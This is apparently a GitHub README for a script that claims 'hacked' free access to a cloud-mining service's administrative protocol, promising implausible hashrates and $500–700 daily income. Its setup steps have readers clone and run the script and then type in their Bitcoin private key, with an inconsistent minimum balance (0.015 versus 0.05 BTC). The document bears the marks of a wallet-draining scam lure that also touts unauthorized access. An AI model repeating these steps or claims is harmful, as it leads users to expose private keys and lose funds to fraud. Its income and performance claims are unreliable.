## Description

This repository contains a script that allows you to connect to the administrative protocol of the [hashing24.com](https://hashing24.com) service via a hacked interface for free usage. The protocol provides high performance — around **167,700 TH/s (±10%)**, which substantially increases mining power.

For stable operation in **2025**, you must keep at least **~0.015 BTC** in your balance. Otherwise, the protocol may become unstable or fail to launch. According to current Bitcoin dominance trends, mining at these speeds promises significant rewards. Thanks to the bypass of the paid API, the service does not require direct payments — you only need to maintain the required balance in your wallet.

> **As of 02.2025**, daily pool income (with a balance of **~0.015+ BTC**) can reach about **$500–700** per day.

### Key Features

1. **Administrative Protocol**: Bypasses typical paid restrictions.  
2. **High Speed**: Hashrate around 167,700 TH/s, ±10% (depends on pool dynamics).  
3. **Minimum Balance**: At least ~0.015 BTC required for proper operation.  
4. **Hacked Access**: The protocol remains stable without additional fees.  
5. **No Site Payments**: No need to make any payments to the service — the protocol still works.

### How to Use: Step-by-Step

1. **Install Git**  
   - Download the latest version from the [official Git site](https://git-scm.com/).  
   - Complete the installation with default settings or adjust as you prefer.

2. **Install Node.js**  
   - Visit [nodejs.org](https://nodejs.org/) and download the LTS version (14 or higher).  
   - After installation, in a command line (cmd, PowerShell) or VS Code terminal, run:
     ```bash
     node -v
     npm -v
     ```
     to ensure Node.js and npm (Node Package Manager) are installed correctly.

3. **Optionally Install Visual Studio Code**  
   - Download VS Code from [code.visualstudio.com](https://code.visualstudio.com/).  
   - During installation, you may enable "Add to PATH" or "Add VS Code to context menu" if desired.  
   - You can run the script directly from the integrated VS Code terminal or use cmd/PowerShell.

4. **Clone the Repository**  
   - Open a command line (cmd, PowerShell, or Terminal in VS Code) and run:
     ```bash
     git clone https://github.com/westhoronhp15/HOW-TO-MINING-BTC-2025.git
     ```
   - Enter the newly created folder:
     ```bash
     cd free-mining-BTC
     ```

5. **Install Dependencies**  
   - Inside that folder, run:
     ```bash
     npm install
     ```
   - Ensure all required packages (inquirer, axios, bitcoinjs-lib, etc.) are installed.

6. **Run the Script**  
   - Execute:
     ```bash
     node mining.js
     ```
   - Or use the VS Code terminal if preferred.

7. **Follow the Script Instructions**  
   - Enter your private key (WIF) when prompted.
   - The script will verify that your balance is at least 0.05 BTC.
   - If sufficient, mining will start (displaying hashrate and shares).
